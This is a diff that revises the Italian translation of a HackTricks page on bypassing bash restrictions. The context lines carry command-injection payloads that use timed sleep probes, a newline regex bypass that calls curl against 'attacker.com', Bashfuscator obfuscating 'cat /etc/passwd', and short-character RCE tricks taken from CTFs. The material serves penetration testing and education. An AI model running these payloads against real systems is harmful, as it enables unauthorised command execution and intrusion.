@@ -2,7 +2,7 @@
 
 <details>
 
-<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>
 
 Altri modi per supportare HackTricks:
 
@@ -10,14 +10,14 @@ Altri modi per supportare HackTricks:
 * Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
 * Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.
+* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e **automatizzare facilmente flussi di lavoro** supportati dagli strumenti comunitari **più avanzati** al mondo.\
+Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e **automatizzare facilmente flussi di lavoro** supportati dagli strumenti della comunità **più avanzati al mondo**.\
 Ottieni l'accesso oggi:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -159,14 +159,14 @@ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
-### Esfiltrazione dati DNS
+### Esfiltrazione dei dati DNS
 
 Potresti utilizzare **burpcollab** o [**pingb**](http://pingb.in) ad esempio.
 
-### Incorporati
+### Builtins
 
-Nel caso in cui non sia possibile eseguire funzioni esterne e si abbia accesso solo a un **set limitato di incorporati per ottenere RCE**, ci sono alcuni trucchi utili per farlo. Di solito **non sarà possibile utilizzare tutti** gli **incorporati**, quindi dovresti **conoscere tutte le tue opzioni** per cercare di aggirare la prigione. Idea da [**devploit**](https://twitter.com/devploit).\
-Prima di tutto controlla tutti gli [**incorporati della shell**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Ecco alcune **raccomandazioni**:
+Nel caso in cui non sia possibile eseguire funzioni esterne e si abbia accesso solo a un **set limitato di builtins per ottenere RCE**, ci sono alcuni trucchi utili per farlo. Di solito **non sarà possibile utilizzare tutti** i **builtins**, quindi dovresti **conoscere tutte le tue opzioni** per cercare di eludere la prigione. Idea da [**devploit**](https://twitter.com/devploit).\
+Prima di tutto controlla tutti i [**shell builtins**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Quindi ecco alcuni **consigli**:
 ```bash
 # Get list of builtins
 declare builtins
@@ -223,7 +223,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Ignorare le espressioni regolari potenziali
+### Ignora le espressioni regolari potenziali
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -233,7 +233,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
-### Esecuzione di codice remoto con 5 caratteri
+### RCE con 5 caratteri
 ```bash
 # From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Oragnge Tsai solution
@@ -280,7 +280,7 @@ ln /f*
 ## If there is a file /flag.txt that will create a hard link
 ## to it in the current folder
 ```
-### Esecuzione di codice remoto con 4 caratteri
+### RCE con 4 caratteri
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
 # it will follow the same principle of creating the command `ls -t>g` in a file
@@ -317,10 +317,10 @@ ln /f*
 ```
 ## Bypass di Lettura-Sola/Esecuzione-Nessuna/Esecuzione-Distroless
 
-Se ti trovi all'interno di un filesystem con le **protezioni di lettura-sola e esecuzione-nessuna** o addirittura in un container distroless, ci sono comunque modi per **eseguire binari arbitrari, persino una shell!:**
+Se ti trovi all'interno di un filesystem con le **protezioni di sola lettura e noexec** o anche in un container distroless, ci sono comunque modi per **eseguire binari arbitrari, persino una shell!:**
 
-{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
-[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
+{% content-ref url="bypass-fs-protections-read-only-no-exec-distroless/" %}
+[bypass-fs-protections-read-only-no-exec-distroless](bypass-fs-protections-read-only-no-exec-distroless/)
 {% endcontent-ref %}
 
 ## Bypass di Chroot e Altre Prigioni
@@ -336,7 +336,7 @@ Se ti trovi all'interno di un filesystem con le **protezioni di lettura-sola e e
 * [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
 * [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
 Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per costruire facilmente e **automatizzare flussi di lavoro** supportati dagli strumenti della comunità più avanzati al mondo.\
@@ -350,10 +350,10 @@ Ottieni l'accesso oggi:
 
 Altri modi per supportare HackTricks:
 
-* Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
 * Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione esclusiva di [**NFT**](https://opensea.io/collection/the-peass-family)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di GitHub.
+* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.
 
 </details>
